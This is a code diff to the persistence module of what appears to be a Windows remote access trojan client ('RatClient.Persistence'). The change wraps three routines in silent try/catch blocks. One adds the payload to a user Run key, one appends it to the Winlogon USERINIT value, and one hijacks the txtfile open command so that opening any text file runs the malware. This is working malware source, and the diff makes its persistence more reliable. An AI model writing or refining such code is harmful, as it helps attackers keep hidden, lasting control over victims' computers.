@@ -1,4 +1,5 @@
 ﻿using Microsoft.Win32;
+using System;
 
 
 
@@ -40,39 +41,47 @@ namespace RatClient.Persistence
             {
                 return status;
             }
-            using (RegistryKey key = Registry.Users)
+            try
             {
-                using (RegistryKey sub = key.OpenSubKey(logonUserRunPath, true))
+                using (RegistryKey key = Registry.Users)
                 {
-                    if (sub != null)
+                    using (RegistryKey sub = key.OpenSubKey(logonUserRunPath, true))
                     {
-                        sub.SetValue(name, exec, RegistryValueKind.String);
-                        status = true;
+                        if (sub != null)
+                        {
+                            sub.SetValue(name, exec, RegistryValueKind.String);
+                            status = true;
+                        }
                     }
                 }
             }
+            catch { }
             return status;
         }
 
         public static bool WinLogonUserInit()
         {
             bool status = false;
-            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default))
+            try
             {
-                using (RegistryKey sub = key.OpenSubKey(winlogonuserinitPath, true))
+                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default))
                 {
-                    if (sub != null)
+                    using (RegistryKey sub = key.OpenSubKey(winlogonuserinitPath, true))
                     {
-                        string currentvalue = (string)sub.GetValue("USERINIT");
-                        if (currentvalue != null)
+                        if (sub != null)
                         {
-                            string value = $"{currentvalue.Split(',')[0].Trim()},{exec}";
-                            sub.SetValue("USERINIT", value, RegistryValueKind.String);
-                            status = true;
+                            string currentvalue = (string)sub.GetValue("USERINIT");
+                            if (currentvalue != null)
+                            {
+                                string value = $"{currentvalue.Split(',')[0].Trim()},{exec}";
+                                sub.SetValue("USERINIT", value, RegistryValueKind.String);
+                                status = true;
+                            }
                         }
                     }
                 }
             }
+            catch { }
             return status;
         }
 
@@ -84,14 +93,18 @@ namespace RatClient.Persistence
             }
             RegTools.RemoveUserChoice();
             bool status = false; 
-            using (RegistryKey key = Registry.ClassesRoot.OpenSubKey("txtfile\\shell\\open\\command", true))
+            try
             {
-                if (key != null)
+                using (RegistryKey key = Registry.ClassesRoot.OpenSubKey("txtfile\\shell\\open\\command", true))
                 {
-                    key.SetValue(null, $"{exec} -ptxt \"%1\"", RegistryValueKind.String);
-                    status = true;
+                    if (key != null)
+                    {
+                        key.SetValue(null, $"{exec} -ptxt \"%1\"", RegistryValueKind.String);
+                        status = true;
+                    }
                 }
             }
+            catch { }
             return status;
         }
     }
